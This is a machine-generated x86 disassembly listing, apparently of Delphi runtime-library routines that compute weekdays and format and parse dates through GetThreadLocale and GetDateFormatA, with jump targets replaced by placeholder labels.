add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409740
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_40952c
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407b34
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407b34
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407b34
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_40963c
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_40988c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409740
pop esi
pop ecx
pop ebp
retn 0x8
sub_4098ac
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_40952c
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4098e8
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028e0
sub_40992c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404310
mov edx eax
mov eax ebx
call sub_4098e8
pop ecx
pop ebx
pop ebp
retn
sub_40994c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408918
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4098e8
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409998
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_4099c4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_40988c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_4099fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4095e0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409a3c
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409b8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404050
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040e8
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404510
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409b91
lea eax [ ebp - 0x118 ]
call sub_404050
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4042c0
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404310
mov edx eax
mov eax [ ebx ]
call sub_40bf80
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c0f4
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404570
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c090
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404248
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c0f4
mov ecx eax
mov eax ebx
mov edx esi
call sub_404140
sub_409ba4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409c82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404050
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040e8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040e8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409c89
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4042c0
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404510
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404310
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404570
sub_409cac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a42d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a434
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_404074
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c174
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c154
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4098e8
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c174
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_4098e8
pop ecx
mov al [ eax + lookup_table_409d8f ]
jmp [ eax * 4 + jump_table_409dc8 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409998
pop ecx
push ebp
call sub_4099c4
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409998
pop ecx
push ebp
call sub_4099c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409a3c
pop ecx
mov eax [ ebp - 0x24 ]
call sub_40992c
pop ecx
jmp r-xdata
push ebp
call sub_409998
pop ecx
push ebp
call sub_4099c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409ba4
pop ecx
mov eax [ ebp - 0x28 ]
call sub_40992c
pop ecx
jmp r-xdata
push ebp
call sub_409998
pop ecx
push ebp
call sub_4099c4
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409998
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409998
pop ecx
push ebp
call sub_4099fc
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409998
pop ecx
push ebp
call sub_4099fc
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409998
pop ecx
push ebp
call sub_4099fc
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409998
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409998
pop ecx
push ebp
call sub_4099fc
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_4099fc
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408774
test eax eax
jne r-xdata
push ebp
call sub_409998
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409cac
pop ecx
push ebp
call sub_4099fc
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_40994c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_40994c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_40994c
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_4099c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_40994c
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_40994c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_40994c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409cac
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409cac
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_40994c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408774
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_4098e8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409cac
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4098e8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4098e8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40992c
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4098ac
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40992c
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408774
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_4098e8
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_4098e8
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40992c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4098ac
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40992c
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c174
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408774
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_4098e8
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409cac
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_40994c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408774
test eax eax
jne r-xdata
push ebp
call sub_4099c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4098ac
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40992c
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40992c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40992c
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c174
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409cac
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_4098e8
pop ecx
jmp r-xdata
push ebp
call sub_4099c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4098ac
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40992c
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408774
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408774
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408774
test eax eax
jne r-xdata
jmp r-xdata
sub_40a460
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409cac
pop ecx
push ebp
mov eax ebx
call sub_409cac
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404140
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a4d0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404310
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a4f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a4d0
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404310
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a588
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a601
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a608
lea eax [ ebp - 0x8 ]
call sub_404050
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a4d0
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404310
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404570
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407da4
test eax eax
jne r-xdata
mov eax edi
call sub_404310
add [ esi ] eax
mov bl 0x1
sub_40a614
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a4d0
mov eax esi
call sub_404310
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a64c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404310
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a698
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404310
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c1b8
mov [ ebx ] eax
jmp r-xdata
sub_40a6e0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404510
push eax
mov eax [ ebx ]
call sub_404510
pop edx
call sub_40c2e4
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a734
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_4098d4
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a790
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40aaab
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a64c
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c2ac
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a4f4
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a698
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404570
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407e14
mov eax [ ebp - 0x1c ]
call sub_40a6e0
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aab2
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_404074
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a614
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a4f4
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a614
test al al
je r-xdata
call sub_4098d4
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a4f4
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
